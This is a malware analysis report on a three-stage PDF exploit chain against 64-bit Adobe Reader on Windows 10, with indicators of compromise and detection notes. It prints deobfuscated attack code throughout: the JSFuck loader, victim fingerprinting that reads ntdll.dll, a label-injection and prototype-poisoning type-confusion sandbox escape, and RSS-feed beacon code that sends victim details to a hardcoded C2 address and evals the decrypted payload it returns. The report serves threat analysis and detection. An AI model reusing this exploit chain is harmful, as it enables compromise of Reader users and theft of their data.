# PDF Exploit Chain Analysis

**Sample:** `54077a5b15638e354fa02318623775b7a1cc0e8c21e59bcbab333035369e377f`  
**MD5:** `522cda0c18b410daa033dc66c48eb75a`  
**SHA1:** `dafd571da1df72fb53bcd250e8b901103b51d6e4`  
**Format:** PDF 1.7, crafted with PyMuPDF  
**Target:** Adobe Acrobat Reader >= 21.001.20138, 64-bit, Windows 10, platform=WIN  
**C2:** `188.214.34.20:34123`  
**Campaign ID:** `od=422974`

---

## Overview

EXPMON has identified a complex PDF exploit aimed at Adobe Reader users. Three-stage JavaScript attack chain delivered inside a PDF. Each stage decodes the next: JSFuck decodes obfuscator.io, which decrypts an AES-CTR+zlib stage 3 payload fetched live from C2. Stage 2 performs an **Acrobat JavaScript sandbox escape** using a type-confusion exploit against internal Adobe APIs — this unlocks Acrobat's privileged JS API tier but does **not** elevate the OS process token. Any OS-level privilege escalation would be the responsibility of the stage 3 payload (not recovered — delivered at runtime from C2).

```
PDF open
  └─ OpenAction → JS (object 11): JSFuck (stage 1)
       └─ base64-decode btn1 field → app.setTimeout(stage2, 500ms)
            └─ Stage 2 (obfuscator.io): fingerprints victim, builds C2 URLs
                 └─ RSS.addFeed(dog1, dog2) → Acrobat fetches JS from C2
                      └─ C2 delivers: AES key (bird0) + ciphertext (bird1)
                           └─ check() decrypts + inflates → eval(stage3)
```

---

## PDF Structure

| Object | Type | Purpose |
|--------|------|---------|
| 1 | Catalog | Root with `/OpenAction` → obj 11 |
| 3 | Names/JavaScript | JS name tree |
| 9 | Widget (AcroForm) | Hidden field `btn1` — stores 98 KB base64 payload |
| 11 | JavaScript stream | Stage 1: JSFuck trigger |
| 22 | Filespec | Repeated ×243 for heap grooming (all point to obj 27) |
| 27 | EmbeddedFile | `TEST` stream — 243 identical copies for heap spray |
| 29 | XObject/Image | 4 MB zero-filled grayscale image (2985×1369) for heap spray |

The heap layout — 243 repeated attachment objects plus a 4 MB zeroed image — is designed to groom the allocator before the type-confusion exploit fires.

---

## Stage 1 — JSFuck Trigger (object 11, 643 bytes)

The PDF `OpenAction` executes a JSFuck-encoded one-liner from the PDF JavaScript name tree. Decoded, it does exactly one thing: reads the hidden form field `btn1`, base64-decodes its value using the internal SOAP API, and schedules execution 500 ms later.

**Encoded (raw from PDF object 11):**
```javascript
app.t = app["s"+({}+[])[[+!+[]]+[+!+[]]]+"tTim"+({}+[])[[+!+[]]+[+!+[]]]+"Out"](
  util["str"+(!+[]/+[]+[])[!+[]+!+[]+!+[]]+"ngFromStr"+({}+[])[[+!+[]]+[+!+[]]]+(+{}+[])[+!+[]]+"m"](
    SOAP["stre"+(+{}+[])[+!+[]]+"mD"+({}+[])[[+!+[]]+[+!+[]]]+"cod"+({}+[])[[+!+[]]+[+!+[]]]](
      util["str"+({}+[])[[+!+[]]+[+!+[]]]+(+{}+[])[+!+[]]+"mFromStr"+(!+[]/+[]+[])[!+[]+!+[]+!+[]]+"ng"](
        getField("btn1")["value"]
      ), "base64"
    )
  ), 500
);
```

**Decoded equivalent:**
```javascript
// Reads btn1.value → SOAP.streamDecode(..., 'base64') → execute as JS after 500ms
app.setTimeout(
  util.stringFromStream(
    SOAP.streamDecode(
      util.streamFromString(getField("btn1").value),
      "base64"
    )
  ),
  500
);
```

The field value in `btn1` is stored as a PDF Name object, which encodes `/` as `#2F`. Standard tools that do not unescape PDF Name sequences will produce corrupt base64. The correct 98,584-byte base64 string decodes to the 73,936-byte stage 2 script.

---

## Stage 2 — Obfuscator.io Payload (73,936 bytes)

Decoded from `btn1` field value. Structure:

- **AES-JS library** (~50 KB) — full embedded aes-js implementation used to decrypt stage 3
- **zlib inflate** — embedded decompressor for stage 3
- **Exploit logic** — fingerprinting, type-confusion exploit, C2 communication

The outer obfuscation uses the standard obfuscator.io pattern: a 141-element shuffled string array, a self-invoking function that rotates the array until a checksum equals `0xb9569` (759145), and a lookup function `a0_0x471eff` used throughout.

**String array rotation (63 push/shift iterations to reach target checksum):**
```javascript
(function(_0x2f94f2, _0x2c4c83) {
  var _0x778fda = a0_0x23c2, _0x371120 = _0x2f94f2();
  while (!![]) {
    try {
      var _0x3dc1db =
        parseInt(_0x778fda(0xf8)) / 1 * (parseInt(_0x778fda(0x10e)) / 2) +
        parseInt(_0x778fda(0x114)) / 3 * (-parseInt(_0x778fda(0xf3)) / 4) +
        parseInt(_0x778fda(0xf4)) / 5 * (-parseInt(_0x778fda(0xff)) / 6) +
        parseInt(_0x778fda(0xe7)) / 7 +
        parseInt(_0x778fda(0xf9)) / 8 +
        parseInt(_0x778fda(0xc5)) / 9 +
        -parseInt(_0x778fda(0x11c)) / 10;
      if (_0x3dc1db === _0x2c4c83) break;       // target: 0xb9569
      else _0x371120['push'](_0x371120['shift']());
    } catch (_0x35e88f) { _0x371120['push'](_0x371120['shift']()); }
  }
}(a0_0x240d, 0xb9569));
```

### 2.1 Victim Fingerprinting

Before contacting C2, the script collects detailed victim information and validates the target environment.

**Environment gate — aborts if any check fails:**
```javascript
// Minimum supported version: 21.001.20138
global["version"] < 21.00120138 && ERRS.push("ERR_UNSUPPORTED_VERSION_" + global["version"]);

// Windows only
app['platform'] != "WIN" && ERRS.push("ERR_UNK_PLATFORM_" + app["platform"]);

// Adobe Reader only (not Acrobat Pro)
app['viewerType'] != "Reader" && ERRS.push("ERR_UNK_VIEWERTYPE_" + app['viewerType']);

// 64-bit Reader only
global["isReader64bit"]() == false && ERRS.push("ERR_NO_64BIT_READER");

// Windows 10 target (not Win7/Win8.1/Win11)
global['getOS']();
global['os'] != 'WIN10' && ERRS.push("ERR_OS_" + global['os'] + "_UNSUPPORTED");
```

**OS fingerprint via filesystem probing:**
```javascript
global["getOS"] = function() {
  app['beginPriv']();
  if (Collab.isDocReadOnly('/c/Windows/AppReadiness') == false) {
    if (Collab.isDocReadOnly("/c/Windows/ADFS") == false)
      global['os'] = "WIN8.1";
    else {
      if (Collab.isDocReadOnly("/c/Windows/System32/bootsvc.dll") == false)
        global['os'] = "WIN11";
      else
        global['os'] = "WIN10";
    }
  } else {
    global['os'] = 'WIN7';
  }
  app["endPriv"]();
};
```

Each `Collab.isDocReadOnly(path)` call tests whether a path exists on disk. Presence/absence of OS-specific directories and files distinguishes Windows versions without any WMI or registry access.

**OS version from ntdll.dll (read directly from disk):**
```javascript
global["getProdVersionString"] = function() {
  app["beginPriv"]();
  stream = util["readFileIntoStream"]("/c/windows/system32/ntdll.dll", false);
  app["endPriv"]();
  data = stream["read"](0xa * 0x400 * 0x400 * 0x2);  // read up to 20 MB
  // Searches for UTF-16LE "ProductVersion" string in the PE version resource
  prod_version_str = '500072006F006400750063007400560065007200730069006F006E00'.toLowerCase();
  prod_version_offset = data["indexOf"](prod_version_str);
  // Extracts the version string bytes following the VS_FIXEDFILEINFO structure
  // ...parses and returns e.g. "10.0.19041.1"
};
```

### 2.2 Acrobat Sandbox Escape — Type Confusion via Internal APIs

**Scope:** `beginPriv()`/`endPriv()` and the type-confusion chain below operate entirely within Acrobat's JavaScript engine. They escalate from Acrobat's *untrusted* JS tier to its *privileged* JS tier. The Windows process token is unchanged — a non-admin user running this exploit remains a non-admin at the OS level. Writing to protected locations such as `C:\Windows\System32\` still requires OS-level admin rights, which this exploit alone does not provide.

The exploit defines `global.deer(fn)` — a wrapper that calls any privileged Acrobat-internal API by abusing the `beginPriv`/`endPriv` JavaScript trust boundary.

**`exec` and `get` helpers (sandbox bypass wrappers):**
```javascript
global["exec"] = function(obj, method, args) {
  ret = undefined;
  app["beginPriv"]();
  ret = method['apply'](obj, args);   // 'apply' is JSFuck-encoded to evade static scan
  app["endPriv"]();
  return ret;
};

global["get"] = function(obj, prop) {
  ret = undefined;
  app["beginPriv"]();
  ret = obj[prop];
  app["endPriv"]();
  return ret;
};
```

**`reindeer()` — the exploit entry point, triggered by `ANFancyAlertImpl` injection:**

The button label for `ANFancyAlertImpl` is crafted to escape its quoting context and inject a `global.reindeer()` call:

```javascript
// Button label is a JS code injection that breaks out of the button callback:
buttons = {
  "a(a(a'); }); global.reindeer(); throw Error('oops'); //": 0x0
};
try {
  ANFancyAlertImpl('', [], 0, buttons, 0, 0, 0, 0, 0);
} catch (e) {}
```

When Acrobat builds the button callback string, it interpolates the label directly. The label terminates the surrounding `a(a(a(` call chain, injects `global.reindeer()`, then comments out the rest — executing with the privileges of the internal alert handler.

**`reindeer()` — sets up `global.deer` (the type-confusion exploit):**
```javascript
global["reindeer"] = () => {
  global["deer"] = function(targetFn) {
    try {
      // Step 1: Bind app.trustedFunction and SOAP.stringFromStream to create
      //         an object whose property accessors call privileged internals
      stream = { 'read': app["trustedFunction"]["bind"](app, targetFn) };
      ob     = { 'getFullName': SOAP["stringFromStream"]["bind"](SOAP, stream) };

      // Step 2: Poison Object.prototype so 'swConn' resolves to ob on any object
      Object["prototype"]["__defineGetter__"]('swConn', () => { return ob; });

      // Step 3: Construct a type-confusion object:
      //   - lastIndexOf calls SilentDocCenterLogin (privileged internal)
      //   - substring throws to trigger a catch path that skips type checks
      data   = { 'WT': '' };
      pwnobj = {
        'lastIndexOf': SilentDocCenterLogin["bind"](app, data, {}),
        'substring':   () => { throw Error(''); }
      };

      // Step 4: Override 'path' getter to return pwnobj instead of a string
      //         ANShareFile reads doc.path.lastIndexOf — gets SilentDocCenterLogin instead
      this['__defineGetter__']("path", () => { return pwnobj; });

      // Step 5: Trigger ANShareFile — it reads 'path', hits pwnobj.lastIndexOf
      //         (= SilentDocCenterLogin), which Acrobat calls with the swConn object,
      //         executing targetFn with elevated privileges
      ANShareFile({ 'doc': eval('th' + 'is') });
    } catch (e) {}
  };
};
```

After `reindeer()` runs, `global.deer` is used to call sensitive APIs that normally require privilege:

```javascript
// Clean up prototype poison, then wrap each privileged function via deer()
delete Object["prototype"]['swConn'];
global["deer"](global["get"]);
global["deer"](global["exec"]);
global["deer"](global['getOS']);
global["deer"](global['isReader64bit']);
global["deer"](global['getProdVersionString']);
```

### 2.3 C2 Communication via RSS Feeds

The script contacts C2 using Acrobat's built-in RSS reader, which fetches the URL and evaluates the response as JavaScript. This avoids any direct network API call from the sandbox.

**URL construction:**
```javascript
var webserver = "188.214.34.20:34123";

// Beacon / stage 3 ciphertext delivery:
// Version < 24.003.20112 uses endpoint /s11, newer uses /s12
var dog0 = global["version"] < 24.00320112 ? 's11' : 's12';
var dog1 = "http://" + webserver + '/' + dog0
         + '?language='     + app["language"]
         + '&viewerType='   + app["viewerType"]
         + '&viewerVersion='+ app['viewerVersion']
         + '&platform='     + app["platform"]
         + '&activeDocs='   + global["activeDocs_count"]
         + '&errs='         + ERRS
         + '&av='           + snake_type        // antivirus info
         + '&osVersion='    + global["getProdVersionString"]()
         + '&pdfFile='      + pdfFile           // full path of opened PDF
         + '&rnd='          + Math["random"]()
         + '&od=422974';                        // campaign ID

// Key delivery:
var mode0 = global["version"] < 24.00320112 ? 'rs1' : 'rs2';
var dog2 = 'http://' + webserver + '/' + mode0
         + '?rnd='  + Math["random"]()
         + '&od=422974';
```

**Feed registration:**
```javascript
function startup() {
  // Remove stale feeds first
  try { global["exec"](RSS, RSS["removeFeed"], [dog1]); } catch(e) {}
  try { global["exec"](RSS, RSS["removeFeed"], [dog2]); } catch(e) {}

  // Register both C2 URLs as JS-type RSS feeds
  // Acrobat fetches them and eval()s the response body as JavaScript
  global["exec"](RSS, RSS["addFeed"], [{ 'cURL': dog2, 'bPersistent': false, 'cType': 'JS' }]);
  global["exec"](RSS, RSS["addFeed"], [{ 'cURL': dog1, 'bPersistent': false, 'cType': 'JS' }]);

  // Poll every 500ms for C2 response to arrive
  global["pig0"] = app["setInterval"]("check()", 500);
}
```

The C2 response JavaScript sets `global.bird0` (AES key as byte array) and `global.bird1` (stage 3 ciphertext as hex string) in the Acrobat JS global scope.

### 2.4 Stage 3 Decryption and Execution

`check()` polls every 500 ms for up to 40 seconds (80 ticks × 500 ms). When both values arrive it decrypts and executes stage 3.

```javascript
function check() {
  if (global["bird1"] != undefined && global["bird0"] != undefined) {
    app["clearInterval"](global["pig0"]);
    global["doc"] = eval('th' + 'is');

    // Decrypt: AES-CTR with key=bird0, counter starting at 1
    encryptedBytes = aesjs["utils"]['hex']["toBytes"](global['bird1']);
    aesCtr         = new aesjs["ctr"](global["bird0"], new aesjs["Counter"](1));
    decryptedBytes = aesCtr["decrypt"](encryptedBytes);

    // Convert byte array to string
    decryptedText = '';
    for (var i = 0; i < decryptedBytes['length']; i++)
      decryptedText += String["fromCharCode"](decryptedBytes[i]);

    // Decompress: zlib inflate
    global["final_js"] = zip_inflate(decryptedText);

    // Zero out keys and ciphertext
    global["bird0"] = undefined;
    global['bird1'] = undefined;

    // Execute stage 3 after 500ms, clean up feeds after 2000ms
    global["tmp1"] = app["setTimeOut"]("eval(global.final_js);", 500);
    global["tmp2"] = app["setTimeOut"]('removeFeeds();', 2000);

  } else {
    global["pig1"] += 1;
    if (global["pig1"] > 80) {         // give up after ~40 seconds
      app["clearInterval"](global["pig0"]);
      try { global["exec"](RSS, RSS['removeFeed'], [dog1]); } catch(e) {}
      try { global["exec"](RSS, RSS["removeFeed"], [dog2]); } catch(e) {}
    }
  }
}
```

---

## Stage 3 — Encrypted Payload (not recovered)

Stage 3 is delivered live from C2 as AES-CTR encrypted, zlib-compressed JavaScript. It is not embedded in the PDF and cannot be recovered without contacting `188.214.34.20:34123`. Based on the stage 2 infrastructure, it likely performs one or more of:

- Shellcode execution or DLL injection via a further Acrobat API exploit
- Persistence via scheduled task, registry, or startup folder
- Additional payload download

---

## IOC Summary

### Network

| Type | Value | Purpose |
|------|-------|---------|
| IP:Port | `188.214.34.20:34123` | C2 server |
| URL | `http://188.214.34.20:34123/s11` | Stage 3 ciphertext (Reader < 24.003) |
| URL | `http://188.214.34.20:34123/s12` | Stage 3 ciphertext (Reader >= 24.003) |
| URL | `http://188.214.34.20:34123/rs1` | AES key delivery (Reader < 24.003) |
| URL | `http://188.214.34.20:34123/rs2` | AES key delivery (Reader >= 24.003) |
| Parameter | `od=422974` | Campaign/operator ID |


### Host Behaviors

| Behavior | Detail |
|----------|--------|
| File read | `\c\windows\system32\ntdll.dll` — OS version fingerprint |
| Path probe | `\c\Windows\AppReadiness`, `\c\Windows\ADFS`, `\c\Windows\System32\bootsvc.dll` — OS version discrimination |
| Acrobat API | `RSS.addFeed`, `ANFancyAlertImpl`, `ANShareFile`, `SilentDocCenterLogin`, `beginPriv`/`endPriv`, `trustedFunction`, `readFileIntoStream` |
| JS globals | `global.bird0`, `global.bird1`, `global.final_js`, `global.reindeer`, `global.deer` |

---

## Exploit Chain Diagram

```
┌─────────────────────────────────────────────────────────────┐
│  PDF opens in Adobe Reader (Windows 10, 64-bit, >= 21.001)  │
└────────────────────────────┬────────────────────────────────┘
                             │ OpenAction
                             ▼
┌─────────────────────────────────────────────────────────────┐
│  STAGE 1: JSFuck (object 11, 643 bytes)                     │
│  • Decodes btn1.value (98 KB base64) via SOAP.streamDecode  │
│  • app.setTimeout(decoded_stage2, 500ms)                    │
└────────────────────────────┬────────────────────────────────┘
                             │ 500ms later
                             ▼
┌─────────────────────────────────────────────────────────────┐
│  STAGE 2: obfuscator.io (73,936 bytes)                      │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ 1. Victim fingerprint                               │    │
│  │    • viewerVersion, platform, viewerType, OS, arch  │    │
│  │    • reads ntdll.dll for exact OS build version     │    │
│  │    • filesystem probing to identify Windows version │    │
│  └────────────────────────┬────────────────────────────┘    │
│  ┌─────────────────────────▼───────────────────────────┐    │
│  │ 2. Sandbox escape (type confusion)                  │    │
│  │    • ANFancyAlertImpl label injection               │    │
│  │      → global.reindeer() executes                   │    │
│  │    • Object.prototype.__defineGetter__ poisoning    │    │
│  │    • SilentDocCenterLogin type confusion            │    │
│  │    • ANShareFile triggers privileged call           │    │
│  │    • beginPriv/endPriv wrappers for all priv APIs   │    │
│  └────────────────────────┬────────────────────────────┘    │
│  ┌─────────────────────────▼───────────────────────────┐    │
│  │ 3. C2 contact via RSS feeds                         │    │
│  │    • RSS.addFeed(dog1) → beacon + stage3 ciphertext │    │
│  │    • RSS.addFeed(dog2) → AES key (bird0)            │    │
│  │    • check() polls every 500ms                      │    │
│  └────────────────────────┬────────────────────────────┘    │
│  ┌─────────────────────────▼───────────────────────────┐    │
│  │ 4. Stage 3 decryption                               │    │
│  │    • AES-CTR(key=bird0, counter=1).decrypt(bird1)   │    │
│  │    • zlib inflate                                   │    │
│  │    • eval(global.final_js)                          │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────┐
│  STAGE 3: AES-CTR + zlib (delivered from C2 at runtime)     │
│  Content unknown — not embedded in PDF                      │
└─────────────────────────────────────────────────────────────┘
```

---

## Detection Notes

- **Static:** The PDF contains no shellcode; all exploit logic is in JavaScript. Signatures should target the JSFuck pattern in object 11, the `ANFancyAlertImpl` button label injection string, and the `188.214.34.20` hardcoded IP.
- **Dynamic:** Network indicators are the most reliable: connections to `188.214.34.20:34123` with URI paths `/s11`, `/s12`, `/rs1`, `/rs2` and the `od=422974` parameter.
- **Behavioral:** `readFileIntoStream` on `ntdll.dll` from within an Acrobat JS context is highly suspicious. `RSS.addFeed` with a `cType:'JS'` pointing to an external IP is also anomalous.
- **Version scope:** The exploit explicitly checks `viewerVersion >= 21.001.20138` and `os == WIN10`. Hosts outside this range are fingerprinted but not exploited — the ERRS array is still reported to C2.
